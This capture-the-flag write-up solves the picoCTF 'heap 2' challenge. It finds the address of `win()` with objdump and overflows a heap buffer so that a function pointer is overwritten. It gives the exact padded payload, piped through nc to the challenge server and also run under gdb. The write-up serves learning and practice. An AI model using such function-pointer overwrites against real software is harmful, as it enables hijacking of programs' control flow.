# heap 2 #

> ## Description ##
>
> Can you handle function pointers? Download the binary here. Download
> [the source](chall.c) here.
>
> Additional details will be available after launching your challenge
> instance.
>
> ## Hints ##
>
> Are you doing the right endianness?

## Solution ##

The application is very convenient: A menu item allows to print the
two variables of interest. The goal is to make the variable `x` point
to the `win()` function. To that end, we first need to find the right
length of string to enter in order to overwrite `x`. Secondly, we need
the address of `win()`. The latter we can get with

``` bash
objdump -Ds ./chall | grep -A 6 '<win>'
```

``` assembly
00000000004011a0 <win>:
  4011a0:       53                      push   %rbx
  4011a1:       48 83 ec 40             sub    $0x40,%rsp
  4011a5:       bf 30 20 40 00          mov    $0x402030,%edi
  4011aa:       be 39 20 40 00          mov    $0x402039,%esi
  4011af:       e8 cc fe ff ff          call   401080 <fopen@plt>
  4011b4:       48 89 e3                mov    %rsp,%rbx
  ...
```

The bytes of the address need to be written backwards to memory,
i.e. we feed in `0xa0114000` so that it exactly overwrites `bico`, which is
the initial value of `x`. Some attempts later, the right length is
found with the local executable, and using 

``` bash
(
	echo 2;
	echo -e aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xa0\\x11\\x40\\x00;
	echo 4
) | nc mimas.picoctf.net 58868
```

we get the flag.

## Learnings ##

* Input redirect in `gdb` works like this:

	``` gdb
	r < <( \
		echo 2; \
		echo -e aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xa0\\x11\\x40\\x00; \
		echo 4 \
		)
	```
